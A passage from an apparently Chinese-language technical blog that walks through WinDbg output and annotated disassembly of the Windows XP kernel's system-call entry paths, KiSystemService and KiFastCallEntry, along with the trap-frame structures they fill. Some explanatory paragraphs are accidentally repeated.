PrcbPad6         : [<span class="number">28</span>] UChar</span><br><span class="line">   +<span class="number">0x8c0</span> CallDpc          : _KDPC</span><br><span class="line">   +<span class="number">0x8e0</span> ChainedInterruptList : Ptr32 Void</span><br><span class="line">   +<span class="number">0x8e4</span> LookasideIrpFloat : Int4B</span><br><span class="line">   +<span class="number">0x8e8</span> SpareFields0     : [<span class="number">6</span>] Uint4B</span><br><span class="line">   +<span class="number">0x900</span> VendorString     : [<span class="number">13</span>] UChar</span><br><span class="line">   +<span class="number">0x90d</span> InitialApicId    : UChar</span><br><span class="line">   +<span class="number">0x90e</span> LogicalProcessorsPerPhysicalProcessor : UChar</span><br><span class="line">   +<span class="number">0x910</span> MHz              : Uint4B</span><br><span class="line">   +<span class="number">0x914</span> FeatureBits      : Uint4B</span><br><span class="line">   +<span class="number">0x918</span> UpdateSignature  : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x920</span> NpxSaveArea      : _FX_SAVE_AREA</span><br><span class="line">   +<span class="number">0xb30</span> PowerState       : _PROCESSOR_POWER_STATE</span><br></pre></td></tr></table></figure>

<ul>
<li><p>查看KPRCB地址（<strong>KiProcessorBlock</strong>），这里是单核，所以只有一个值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dd KiProcessorBlock  L2</span><br><span class="line"><span class="number">8055</span>d5a0  ffdff120 <span class="number">00000000</span></span><br></pre></td></tr></table></figure>

<p><code>ffdff120</code>这个地址减去0x120就是KPCR的地址。</p>
</li>
<li><p>查看CPU数量（<strong>KeNumberProcessors</strong> ）。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dd KeNumberProcessors</span><br><span class="line"><span class="number">80556</span>a60  <span class="number">00000001</span> <span class="number">00000006</span> <span class="number">00008e0</span>a a0013fff</span><br><span class="line"><span class="number">80556</span>a70  <span class="number">806</span>ceec0 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000061</span></span><br><span class="line"><span class="number">80556</span>a80  <span class="number">8003f</span>0e0 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>接着分析<code>KiSystemService</code>函数代码：</p>
<p><img data-src="https://s2.loli.net/2022/02/19/TdAGBr9ma7QPqtW.png" alt="15.png"></p>
<p><img data-src="https://s2.loli.net/2022/02/19/8iAfJNKYGmswdIC.png" alt="14.png"></p>
<p>这里的<code>FS:124</code>为_KPRCB的第3个成员CurrentThread，是当前CPU所执行线程的<code>_ETHREAD</code>。<code>_ETHREAD</code>部分成员如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _ETHREAD</span><br><span class="line">ntdll!_ETHREAD</span><br><span class="line">   +<span class="number">0x000</span> Tcb              : _KTHREAD</span><br><span class="line">   +<span class="number">0x1c0</span> CreateTime       : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x1c0</span> NestedFaultCount : Pos <span class="number">0</span>, <span class="number">2</span> Bits</span><br><span class="line">   +<span class="number">0x1c0</span> ApcNeeded        : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x1c8</span> ExitTime         : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x1c8</span> LpcReplyChain    : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x1c8</span> KeyedWaitChain   : _LIST_ENTRY</span><br></pre></td></tr></table></figure>

<p>第一个成员为<code>_KTHREAD    </code>，<code>_KTHREAD    </code>部分成员如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _KTHREAD</span><br><span class="line">ntdll!_KTHREAD</span><br><span class="line">   +<span class="number">0x000</span> Header           : _DISPATCHER_HEADER</span><br><span class="line">   +<span class="number">0x010</span> MutantListHead   : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x018</span> InitialStack     : Ptr32 Void</span><br><span class="line">   +<span class="number">0x01c</span> StackLimit       : Ptr32 Void</span><br><span class="line">   +<span class="number">0x020</span> Teb              : Ptr32 Void</span><br><span class="line">   +<span class="number">0x02c</span> DebugActive      : UChar</span><br><span class="line">   +<span class="number">0x02d</span> State            : UChar</span><br><span class="line">...</span><br><span class="line">   +<span class="number">0x0e0</span> ServiceTable     : Ptr32 Void	<span class="comment">//SystemServiceTable系统服务表SST</span></span><br><span class="line">   +<span class="number">0x0e4</span> Queue            : Ptr32 _KQUEUE</span><br><span class="line">...</span><br><span class="line">   +<span class="number">0x138</span> ApcStatePointer  : [<span class="number">2</span>] Ptr32 _KAPC_STATE</span><br><span class="line">   +<span class="number">0x140</span> PreviousMode     : Char</span><br><span class="line">   +<span class="number">0x141</span> EnableStackSwap  : UChar</span><br><span class="line">   +<span class="number">0x142</span> LargeStack       : UChar</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2022/02/19/VNvG3MpILz8oSm7.png" alt="16.png"></p>
<p><img data-src="https://s2.loli.net/2022/02/19/oXJMatg9FZr1Pwk.png" alt="17.png"></p>
<p>0FFDFF124h+140h就是<code>PreviousMode</code>，意为先前模式。</p>
<p>保存老的先前模式，因为一段代码如果是0环执行和3环执行是不一样的，记录调用这段代码之前是0环的还是3环的。</p>
<p>接着分析代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sub     esp, <span class="number">48</span>h</span><br></pre></td></tr></table></figure>

<p>将esp指向<code>_Trap_Frame</code>的起始位置。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov    ebx, [esp+<span class="number">68</span>h+arg_0]</span><br><span class="line"><span class="keyword">and</span>     ebx, <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>这里arg_0是4</p>
<p>那么就是将esp+6c位置上的值赋给ebx，并与上1。esp+6c位置就是cs的值，主要是为了判断权限的问题，如果是3环来的，cs的值是11，如果是0环来的，cs的值是8。所以与后如果是0，那么就是0环来的，如果是1，那么就是3环来的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov     [esi+<span class="number">140</span>h], bl</span><br></pre></td></tr></table></figure>

<p>esi是KTHREAD，esi+140偏移的地方正好是先前模式，将值赋给先前模式，“新的先前模式”。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov     ebp, esp</span><br></pre></td></tr></table></figure>

<p>esp和ebp此时都指向Trap_Frame的首地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov     ebx, [esi+<span class="number">134</span>h]</span><br></pre></td></tr></table></figure>

<p>esi+134h是KTHREAD+134h偏移又是TrapFrame，这里也可以验证TrapFrame结构体实际上是一个线程一份，因为在KTHREAD这个线程结构体中有一份，而KTHREAD是每个线程一份。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov     [ebp+<span class="number">3</span>Ch], ebx</span><br><span class="line">mov     [esi+<span class="number">134</span>h], ebp</span><br></pre></td></tr></table></figure>

<p>将老的TrapFrame的值存在一个位置上，然后将新的TrapFrame放到esi+134h这个位置。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov     ebx, [ebp+<span class="number">60</span>h]</span><br><span class="line">mov     edi, [ebp+<span class="number">68</span>h]</span><br></pre></td></tr></table></figure>

<p>将原来三环的ebp放到ebx里，将三环eip放到了edi中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov     [ebp+<span class="number">0</span>Ch], edx</span><br></pre></td></tr></table></figure>

<p>进0环的时候，edx保存的是参数的地址，这里赋值给TrapFrame+0Ch偏移正好是<code>DbgArgPointer</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov     [ebp+<span class="number">0</span>], ebx</span><br><span class="line">mov     [ebp+<span class="number">4</span>], edi</span><br></pre></td></tr></table></figure>

<p>TrapFrame+0h 和TrapFrame+4h分别是DbgEbp和DbgEip。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">test    byte ptr [esi+<span class="number">2</span>Ch], <span class="number">0F</span>Fh</span><br></pre></td></tr></table></figure>

<p>判断是否处于调试状态（DebugActive），如果是处于调试状态，才会把cr0-cr7存到TrapFrame结构体中，如果没处于调试状态就不存cr0-cr7的值。那么就是将esp+6c位置上的值赋给ebx，并与上1。esp+6c位置就是cs的值，主要是为了判断权限的问题，如果是3环来的，cs的值是11，如果是0环来的，cs的值是8。所以与后如果是0，那么就是0环来的，如果是1，那么就是3环来的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov     [esi+<span class="number">140</span>h], bl</span><br></pre></td></tr></table></figure>

<p>esi是KTHREAD，esi+140偏移的地方正好是先前模式，将值赋给先前模式，“新的先前模式”。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov     ebp, esp</span><br></pre></td></tr></table></figure>

<p>esp和ebp此时都指向Trap_Frame的首地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov     ebx, [esi+<span class="number">134</span>h]</span><br></pre></td></tr></table></figure>

<p>esi+134h是KTHREAD+134h偏移又是TrapFrame，这里也可以验证TrapFrame结构体实际上是一个线程一份，因为在KTHREAD这个线程结构体中有一份，而KTHREAD是每个线程一份。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov     [ebp+<span class="number">3</span>Ch], ebx</span><br><span class="line">mov     [esi+<span class="number">134</span>h], ebp</span><br></pre></td></tr></table></figure>

<p>将老的TrapFrame的值存在一个位置上，然后将新的TrapFrame放到esi+134h这个位置。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov     ebx, [ebp+<span class="number">60</span>h]</span><br><span class="line">mov     edi, [ebp+<span class="number">68</span>h]</span><br></pre></td></tr></table></figure>

<p>将原来三环的ebp放到ebx里，将三环eip放到了edi中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov     [ebp+<span class="number">0</span>Ch], edx</span><br></pre></td></tr></table></figure>

<p>进0环的时候，edx保存的是参数的地址，这里赋值给TrapFrame+0Ch偏移正好是<code>DbgArgPointer</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov     [ebp+<span class="number">0</span>], ebx</span><br><span class="line">mov     [ebp+<span class="number">4</span>], edi</span><br></pre></td></tr></table></figure>

<p>TrapFrame+0h 和TrapFrame+4h分别是DbgEbp和DbgEip。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">test    byte ptr [esi+<span class="number">2</span>Ch], <span class="number">0F</span>Fh</span><br></pre></td></tr></table></figure>

<p>判断是否处于调试状态（DebugActive），如果是处于调试状态（<code>DebugActive != 0xFF</code>），才会把Dr0-Dr7存到TrapFrame结构体中，如果没处于调试状态就不存Dr0-Dcr7的值。</p>
<div class="note default"><p>通过对函数<code>KiSystemService</code>的分析，已经知道如下的问题一和问题三。原来的寄存器存储到了 _Trap_Frame 结构体里，3环API参数指针通过EDX传给0环。</p>
<ol>
<li>进0环后，原来的寄存器存在哪里？</li>
<li>如何根据系统调用号（eax中存储）找到要执行的内核函数？</li>
<li>调用时参数是存储到3环的堆栈，如何传递给内核函数？</li>
<li>2种调用方式是如何返回到3环的？</li>
</ol>
</div>

<h3 id="4-4-完整分析KiSystemService"><a href="#4-4-完整分析KiSystemService" class="headerlink" title="4.4 完整分析KiSystemService"></a>4.4 完整分析KiSystemService</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0046</span>A451 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:<span class="number">0046</span>A451</span><br><span class="line">.text:<span class="number">0046</span>A451</span><br><span class="line">.text:<span class="number">0046</span>A451 _KiSystemService proc near              ; CODE XREF: ZwAcceptConnectPort(x,x,x,x,x,x)+C↑p</span><br><span class="line">.text:<span class="number">0046</span>A451                                         ; ZwAccessCheck(x,x,x,x,x,x,x,x)+C↑p ...</span><br><span class="line">.text:<span class="number">0046</span>A451</span><br><span class="line">.text:<span class="number">0046</span>A451 arg_0           = dword ptr  <span class="number">4</span></span><br><span class="line">.text:<span class="number">0046</span>A451</span><br><span class="line">.text:<span class="number">0046</span>A451                 push    <span class="number">0</span>	<span class="comment">//PUSH Errode，错误码初始化为0</span></span><br><span class="line">.text:<span class="number">0046</span>A453                 push    ebp	<span class="comment">//保存3环寄存器的值</span></span><br><span class="line">.text:<span class="number">0046</span>A454                 push    ebx</span><br><span class="line">.text:<span class="number">0046</span>A455                 push    esi</span><br><span class="line">.text:<span class="number">0046</span>A456                 push    edi</span><br><span class="line">.text:<span class="number">0046</span>A457                 push    fs</span><br><span class="line">.text:<span class="number">0046</span>A459                 mov     ebx, <span class="number">30</span>h	<span class="comment">//使用段选择子0x30对应的段描述符来更新FS段寄存器FS的值</span></span><br><span class="line">.text:<span class="number">0046</span>A45E                 mov     fs, bx	<span class="comment">//查GDT表得ffc093df`f0000001(0环数据段,RPL == 0)</span></span><br><span class="line">.text:<span class="number">0046</span>A461                 assume fs:nothing<span class="comment">//fs.base = ffdff000，指向当前CPU的KPCR结构</span></span><br><span class="line">.text:<span class="number">0046</span>A461                 push    large dword ptr fs:<span class="number">0</span>	<span class="comment">//保存旧的 ExceptionList，然后把新的清成-1</span></span><br><span class="line">.text:<span class="number">0046</span>A468                 mov     large dword ptr fs:<span class="number">0</span>, <span class="number">0F</span>FFFFFFFh</span><br><span class="line">.text:<span class="number">0046</span>A473                 mov     esi, large fs:<span class="number">124</span>h	<span class="comment">//esi = _KTHREAD结构</span></span><br><span class="line">.text:<span class="number">0046</span>A47A                 push    dword ptr [esi+<span class="number">140</span>h]	<span class="comment">//_KTHREAD+0x40 == PreviousMode压栈</span></span><br><span class="line">.text:<span class="number">0046</span>A480                 sub     esp, <span class="number">48</span>h			<span class="comment">//此时esp指向偏移0x48处，然后将其提升使其指向_TrapFrame首地址</span></span><br><span class="line">.text:<span class="number">0046</span>A483                 mov     ebx, [esp+<span class="number">68</span>h+arg_0]	<span class="comment">//arg_0==4，ebx = CS3</span></span><br><span class="line">.text:<span class="number">0046</span>A487                 <span class="keyword">and</span>     ebx, <span class="number">1</span>			<span class="comment">//CS3 &amp; 0x1</span></span><br><span class="line">.text:<span class="number">0046</span>A48A                 mov     [esi+<span class="number">140</span>h], bl		<span class="comment">//将CS3填充至先前模式PreviousMode</span></span><br><span class="line">.text:<span class="number">0046</span>A490                 mov     ebp, esp			<span class="comment">//ebp = esp = _TrapFrame首地</span></span><br><span class="line">.text:<span class="number">0046</span>A492                 mov     ebx, [esi+<span class="number">134</span>h]		<span class="comment">//ebp = _KTHREAD+0x134 = _TrapFrame</span></span><br><span class="line">.text:<span class="number">0046</span>A498                 mov     [ebp+<span class="number">3</span>Ch], ebx		<span class="comment">//_KTRAP_FRAME.Edx = ebp+3Ch，指向旧的 CurrentThread.TrapFrame</span></span><br><span class="line">.text:<span class="number">0046</span>A49B                 mov     [esi+<span class="number">134</span>h], ebp		<span class="comment">//CurrentThread.TrapFrame 指向当前 _KTRAP_FRAME</span></span><br><span class="line">.text:<span class="number">0046</span>A4A1                 cld				<span class="comment">//df = 0</span></span><br><span class="line">.text:<span class="number">0046</span>A4A2                 mov     ebx, [ebp+<span class="number">60</span>h]		<span class="comment">//ebx = ebp3</span></span><br><span class="line">.text:<span class="number">0046</span>A4A5                 mov     edi, [ebp+<span class="number">68</span>h]		<span class="comment">//edi = eip3</span></span><br><span class="line">.text:<span class="number">0046</span>A4A8                 mov     [ebp+<span class="number">0</span>Ch], edx		<span class="comment">//_KTRAP_FRAME.DbgArgPointer = edx，保存3环API参数指针</span></span><br><span class="line">.text:<span class="number">0046</span>A4AB                 mov     dword ptr [ebp+<span class="number">8</span>], <span class="number">0B</span>ADB0D00h <span class="comment">//目前不清楚具体意思</span></span><br><span class="line">.text:<span class="number">0046</span>A4B2                 mov     [ebp+<span class="number">0</span>], ebx		<span class="comment">//_KTRAP_FRAME.DbgEbp = ebp3</span></span><br><span class="line">.text:<span class="number">0046</span>A4B5                 mov     [ebp+<span class="number">4</span>], edi		<span class="comment">//_KTRAP_FRAME.DbgEip = eip3</span></span><br><span class="line">.text:<span class="number">0046</span>A4B8                 test    byte ptr [esi+<span class="number">2</span>Ch], <span class="number">0F</span>Fh	<span class="comment">//_KTHREAD+0x2C = DebugActive，判断是否处于调试状态</span></span><br><span class="line">.text:<span class="number">0046</span>A4BC                 jnz     Dr_kss_a			<span class="comment">//如果是处于调试状态，才会把cr0-cr7存到TrapFrame结构体中</span></span><br><span class="line">  								<span class="comment">//如果没处于调试状态就不存cr0-cr7的值</span></span><br><span class="line">.text:<span class="number">0046</span>A4C2</span><br><span class="line">.text:<span class="number">0046</span>A4C2 loc_46A4C2:                             ; CODE XREF: Dr_kss_a+<span class="number">10</span>↑j</span><br><span class="line">.text:<span class="number">0046</span>A4C2                                         ; Dr_kss_a+<span class="number">7</span>C↑j</span><br><span class="line">.text:<span class="number">0046</span>A4C2                 sti				<span class="comment">//允许中断</span></span><br><span class="line">.text:<span class="number">0046</span>A4C3                 jmp     loc_46A5AF</span><br><span class="line">.text:<span class="number">0046</span>A4C3 _KiSystemService endp</span><br></pre></td></tr></table></figure>



<h2 id="5-完整分析KiFastCallEntry"><a href="#5-完整分析KiFastCallEntry" class="headerlink" title="5 完整分析KiFastCallEntry"></a>5 完整分析KiFastCallEntry</h2><div class="note danger"><p>从3环<strong>KiFastSystemCall</strong>通过<code>sysenter</code>进入0环后，会调用函数<strong>KiFastCallEntry</strong>，其中CS0、EIP、SS0 &#x3D; CS0 + 8从MSR寄存器中来，<strong>ESP0从TSS中获取</strong>。</p>
<p>与中断门进入0环后调用KiSystemService函数中前部分是不太一样，快速调用进来0环的SS3、ESP3、EFLAG3、CS3、EIP3由操作系统来压栈（中断门进入由CPU自己压栈）。</p>
<p><strong>KiFastCallEntry</strong>也需要将<code>_KTRAP_FRAME</code>结构填满。</p>
</div>

<h3 id="5-1-进入0环前的堆栈与寄存器"><a href="#5-1-进入0环前的堆栈与寄存器" class="headerlink" title="5.1 进入0环前的堆栈与寄存器"></a>5.1 进入0环前的堆栈与寄存器</h3><p>通过正常的系统调用从3环进入0环都会从<code>Ntdll.dll</code>里面的函数调用<code>KiFastSystemCall</code>进去R0。</p>
<p>那么这里就来分析一下，一个 API 函数在调用<code>Ntdll.dll</code>前都会做一些什么工作？这里以<code>Kernel32.dll</code>中的函数<code>ReadProcessMemory</code>来进行举例说明。</p>
<p>函数<code>ReadProcessMemory</code>进入0环前，在<mark class="label primary">3环</mark>的<strong>堆栈</strong>以及<strong>寄存器</strong>的值如下：</p>
<p><img data-src="https://s2.loli.net/2022/07/12/gAyx1mZJGhSHn7z.png" alt="50.png"></p>
<p>这里查看一下<code>IA32_SYSENTER_EIP</code>是到0环的哪个地方执行：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; rdmsr <span class="number">176</span></span><br><span class="line">msr[<span class="number">176</span>] = <span class="number">00000000</span>`<span class="number">80542520</span>	<span class="comment">//查看EIP</span></span><br><span class="line">  </span><br><span class="line">kd&gt; u <span class="number">80542520</span></span><br><span class="line">nt!KiFastCallEntry:</span><br><span class="line"><span class="number">80542520</span> b923000000      mov     ecx,<span class="number">23</span>h</span><br><span class="line"><span class="number">80542525</span> <span class="number">6</span>a30            push    <span class="number">30</span>h</span><br><span class="line"><span class="number">80542527</span> <span class="number">0f</span>a1            pop     fs</span><br><span class="line"><span class="number">80542529</span> <span class="number">8</span>ed9            mov     ds,cx</span><br><span class="line"><span class="number">8054252b</span> <span class="number">8</span>ec1            mov     es,cx</span><br><span class="line"><span class="number">8054252</span>d <span class="number">648b</span>0d40000000  mov     ecx,dword ptr fs:[<span class="number">40</span>h]</span><br><span class="line"><span class="number">80542534</span> <span class="number">8b</span>6104          mov     esp,dword ptr [ecx+<span class="number">4</span>]</span><br><span class="line"><span class="number">80542537</span> <span class="number">6</span>a23            push    <span class="number">23</span>h</span><br></pre></td></tr></table></figure>

<p>可以看到是0环的<code>KiFastCallEntry</code>函数。</p>
<h3 id="5-2-KiFastCallEntry函数分析"><a href="#5-2-KiFastCallEntry函数分析" class="headerlink" title="5.2 KiFastCallEntry函数分析"></a>5.2 KiFastCallEntry函数分析</h3><div class="note danger"><p><strong>注意事项</strong>：</p>
<ol>
<li><p>快速调用进入0环后，CPU<strong>并不会像中断门调用进入0环那样自动将寄存器SS、ESP3、Eflags3、CS、EIP3压入0环堆栈</strong>（TrapFrame）。</p>
</li>
<li><p>进入0环时，<strong>edx 寄存器并非直接指向3环 API 的参数</strong>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">add edx, <span class="number">8</span> <span class="comment">//此时edx指向3环API参数。这也说明在3环时edx+8才指向API的参数</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>使用<code>int 0x2e</code>进入0环后，当<code>TrapFrame</code>的成员<strong>都初始化完成后</strong>，会在函数<code>_KiSystemService</code>中会设置<code>KTRAP_FRAME._Edx = Currentthread-&gt;TrapFrame</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0046</span>A473                 mov     esi, large fs:_KPCR.PrcbData.CurrentThread</span><br><span class="line">...</span><br><span class="line">.text:<span class="number">0046</span>A492                 mov     ebx, [esi+_KTHREAD.TrapFrame]</span><br><span class="line">.text:<span class="number">0046</span>A498                 mov     [ebp+_KTRAP_FRAME._Edx], ebx</span><br></pre></td></tr></table></figure>

<p>但是在<code>KiFastCallEntry</code>中并没有发现会将当前线程的<code>TrapFrame</code>保存起来。</p>
<p><strong>但是</strong>：在函数<code>KiFastCallEntry</code>、<code>NtRaiseException</code>等这些函数中都会有如下代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0046</span>A625                 mov     edx, [ebp+_KTRAP_FRAME._Edx] </span><br><span class="line">.text:<span class="number">0046</span>A628                 mov     [ecx+_KTHREAD.TrapFrame], edx</span><br></pre></td></tr></table></figure>

<p>用来恢复<code>TrapFrame</code>。尽管在<code>KiFastCallEntry</code>没有看到使用<code>KTRAP_FRAME._Edx</code>保存<code>TrapFrame</code>，但是从其他函数逆向分析来看，**“假装”<code>KiFastCallEntry</code>函数会像函数<code>_KiSystemService</code>中一样设置<code>KTRAP_FRAME._Edx = Currentthread-&gt;TrapFrame</code>**。</p>
</li>
</ol>
</div>

<ol>
<li>先处理段寄存器<ul>
<li>FS &#x3D; 0x30</li>
<li>DS &#x3D; 0x23</li>
<li>ES &#x3D; 0x23</li>
</ul>
</li>
<li><code>esp0 = TSS.ESP0</code>，找到当前线程的栈顶</li>
</ol>
<p>进入系统服务函数之前，<code>KiFastCallEntry</code>堆栈与寄存器图：</p>
<p><img data-src="https://s2.loli.net/2022/07/12/Bhqnk1LGlAMov8m.png" alt="51.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0046</span>A520 <span class="comment">// =============== S U B R O U T I N E =======================================</span></span><br><span class="line">.text:<span class="number">0046</span>A520</span><br><span class="line">.text:<span class="number">0046</span>A520 <span class="comment">// ----</span></span><br><span class="line">.text:<span class="number">0046</span>A520 <span class="comment">// 从3环函数 KiFastSystemCall 的 sysenter 指令调用</span></span><br><span class="line">.text:<span class="number">0046</span>A520 <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0046</span>A520 <span class="comment">// edx = esp3, eax = 0xIndex</span></span><br><span class="line">.text:<span class="number">0046</span>A520 <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0046</span>A520 <span class="comment">// ----</span></span><br><span class="line">.text:<span class="number">0046</span>A520</span><br><span class="line">.text:<span class="number">0046</span>A520 _KiFastCallEntry proc near              <span class="comment">// DATA XREF: KiLoadFastSyscallMachineSpecificRegisters(x)+24↑o</span></span><br><span class="line">.text:<span class="number">0046</span>A520                                         <span class="comment">// _KiTrap01+74↓o</span></span><br><span class="line">.text:<span class="number">0046</span>A520</span><br><span class="line">.text:<span class="number">0046</span>A520 var_B           = byte ptr <span class="number">-0B</span>h</span><br><span class="line">.text:<span class="number">0046</span>A520</span><br><span class="line">.text:<span class="number">0046</span>A520 <span class="comment">// FUNCTION CHUNK AT .text:0046A4ED SIZE 00000026 BYTES</span></span><br><span class="line">.text:<span class="number">0046</span>A520 <span class="comment">// FUNCTION CHUNK AT .text:0046A7C0 SIZE 00000014 BYTES</span></span><br><span class="line">.text:<span class="number">0046</span>A520</span><br><span class="line">.text:<span class="number">0046</span>A520                 mov     ecx, <span class="number">23</span>h</span><br><span class="line">.text:<span class="number">0046</span>A525                 push    <span class="number">30</span>h             <span class="comment">// 开始修改段寄存器为0环的值</span></span><br><span class="line">.text:<span class="number">0046</span>A527                 pop     fs              <span class="comment">// fs = 0x30，查GDT表得ffc093df`f0000001(0环数据段,RPL == 0)</span></span><br><span class="line">.text:<span class="number">0046</span>A529                 mov     ds, ecx         <span class="comment">// ds = 0x23，00cffb00`0000ffff(3环数据段,RPL == 3    )</span></span><br><span class="line">.text:<span class="number">0046</span>A52B                 mov     es, ecx         <span class="comment">// es = 0x23</span></span><br><span class="line">.text:<span class="number">0046</span>A52D                 mov     ecx, large fs:_KPCR.TSS</span><br><span class="line">.text:<span class="number">0046</span>A534                 mov     esp, [ecx+<span class="number">4</span>]    <span class="comment">// ----</span></span><br><span class="line">.text:<span class="number">0046</span>A534                                         <span class="comment">// esp = TSS.esp0，切换到0环堆栈</span></span><br><span class="line">.text:<span class="number">0046</span>A534                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0046</span>A534                                         <span class="comment">// TSS.esp0 指向当前线程 TrapFrame 0x7C V86ES</span></span><br><span class="line">.text:<span class="number">0046</span>A534                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0046</span>A534                                         <span class="comment">// 从这里可以知道 KiFastEntry 的函数堆栈即为当前线程的 TrapFrame</span></span><br><span class="line">.text:<span class="number">0046</span>A534                                         <span class="comment">// 下面开始从 HardwareSegss 开始填充 TrapFrame （当前函数堆栈）</span></span><br><span class="line">.text:<span class="number">0046</span>A534                                         <span class="comment">// ----</span></span><br><span class="line">.text:<span class="number">0046</span>A537                 push    <span class="number">23</span>h             <span class="comment">// HardwareSegSs = 0x23</span></span><br><span class="line">.text:<span class="number">0046</span>A539                 push    edx             <span class="comment">// HardwareSegEsp = esp3 == 3环的第二个返回地址</span></span><br><span class="line">.text:<span class="number">0046</span>A53A                 pushf</span><br><span class="line">.text:<span class="number">0046</span>A53B</span><br><span class="line">.text:<span class="number">0046</span>A53B loc_46A53B:                             <span class="comment">// CODE XREF: _KiFastCallEntry2+23↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A53B                 push    <span class="number">2</span></span><br><span class="line">.text:<span class="number">0046</span>A53D                 add     edx, <span class="number">8</span>          <span class="comment">// 此时 edx 指向 3 环的第一个参数</span></span><br><span class="line">.text:<span class="number">0046</span>A540                 popf                    <span class="comment">// EFlags = 0x02，即清空0环所有标志位</span></span><br><span class="line">.text:<span class="number">0046</span>A541                 <span class="keyword">or</span>      [esp+<span class="number">0</span>Ch+var_B], <span class="number">2</span> <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A541                                         <span class="comment">// 此时esp 指向 KTRAP_FRAME.EFlags</span></span><br><span class="line">.text:<span class="number">0046</span>A541                                         <span class="comment">// eflag(8~15bit)</span></span><br><span class="line">.text:<span class="number">0046</span>A541                                         <span class="comment">// 将3环 EFlags 的 IF = 1,以响应接受可屏蔽中断</span></span><br><span class="line">.text:<span class="number">0046</span>A541                                         <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A546                 push    <span class="number">1B</span>h             <span class="comment">// KTRAP_FRAME.SegCs = 0x1B = CS3</span></span><br><span class="line">.text:<span class="number">0046</span>A548                 push    dword ptr ds:<span class="number">0F</span>FDF0304h <span class="comment">// --</span></span><br><span class="line">.text:<span class="number">0046</span>A548                                         <span class="comment">// KTRAP_FRAME.Eip = _KUSER_SHARED_DATA.SystemCallReturn返回地址</span></span><br><span class="line">.text:<span class="number">0046</span>A548                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0046</span>A548                                         <span class="comment">// 也就是说从 0 环返回 3 环时将会返回到这个函数</span></span><br><span class="line">.text:<span class="number">0046</span>A548                                         <span class="comment">// --</span></span><br><span class="line">.text:<span class="number">0046</span>A54E                 push    <span class="number">0</span></span><br><span class="line">.text:<span class="number">0046</span>A550                 push    ebp</span><br><span class="line">.text:<span class="number">0046</span>A551                 push    ebx</span><br><span class="line">.text:<span class="number">0046</span>A552                 push    esi</span><br><span class="line">.text:<span class="number">0046</span>A553                 push    edi</span><br><span class="line">.text:<span class="number">0046</span>A554                 mov     ebx, large fs:_KPCR.SelfPcr</span><br><span class="line">.text:<span class="number">0046</span>A55B                 push    <span class="number">3B</span>h             <span class="comment">// _KTRAP_FRAME.SegFs = 0x3B，让3环FS找到对应的段描述符</span></span><br><span class="line">.text:<span class="number">0046</span>A55D                 mov     esi, [ebx+_KPCR.PrcbData.CurrentThread]</span><br><span class="line">.text:<span class="number">0046</span>A563                 push    dword ptr [ebx] <span class="comment">// 保存旧的 ExceptionList</span></span><br><span class="line">.text:<span class="number">0046</span>A565                 mov     dword ptr [ebx], <span class="number">0F</span>FFFFFFFh <span class="comment">// 当前线程ExceptionList = -1</span></span><br><span class="line">.text:<span class="number">0046</span>A56B                 mov     ebp, [esi+_KTHREAD.InitialStack] <span class="comment">// ----</span></span><br><span class="line">.text:<span class="number">0046</span>A56B                                         <span class="comment">// ebp = _KPCR._KPRCB._KTHREAD.InitialStack（栈底），KernelStack（栈顶）</span></span><br><span class="line">.text:<span class="number">0046</span>A56B                                         <span class="comment">// 从线程切换分析可以知道：KTHREAD.InitialStack（栈底）指向当前线程的浮点寄存器 